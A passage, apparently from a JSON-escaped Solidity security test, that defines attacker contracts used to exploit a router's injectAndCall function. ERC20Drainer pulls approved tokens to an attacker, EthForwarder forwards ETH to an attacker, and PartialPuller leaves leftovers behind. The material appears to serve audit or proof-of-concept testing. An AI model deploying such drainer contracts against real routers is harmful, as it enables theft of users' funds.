cker), d, \"attacker stole leftovers d\");\n    }\n}\n\n// -------------------------------------------------------------------------\n// Attacker Contracts\n// -------------------------------------------------------------------------\n\n/// @dev Attacker-controlled contract that drains ERC20 tokens\n/// @notice Called by router via injectAndCall, pulls tokens via transferFrom\ncontract ERC20Drainer {\n    /// @dev Pulls tokens from msg.sender (router) to recipient\n    /// @param token The ERC20 token to drain\n    /// @param to The recipient address (attacker)\n    /// @param amount The amount to drain (injected by injectAndCall)\n    function rug(address token, address to, uint256 amount) external {\n        // msg.sender here is TrailsRouter (has approved us for `amount`)\n        // Pull tokens from router to attacker\n        IERC20(token).transferFrom(msg.sender, to, amount);\n    }\n}\n\n/// @dev Attacker-controlled contract that forwards ETH\n/// @notice Called by router via injectAndCall, forwards ETH to attacker\ncontract EthForwarder {\n    address payable public recipient;\n\n    constructor(address payable _recipient) {\n        recipient = _recipient;\n    }\n\n    /// @dev Receives ETH from router and forwards to attacker\n    function pwn() external payable {\n        // Forward all received ETH to attacker\n        (bool success, ) = recipient.call{value: msg.value}(\"\");\n        require(success, \"ETH forward failed\");\n    }\n\n    /// @dev Fallback to receive ETH\n    receive() external payable {}\n}\n\n/// @dev Target that only pulls a partial amount from the router, leaving leftovers\ncontract PartialPuller {\n    function pull(\n        address token,\n        uint256 amountToPull,\n        address receiver\n    ) external {\n        IERC20(token).transferFrom(msg.sender, receiver, amountToPull);\n    }\n}\n```",
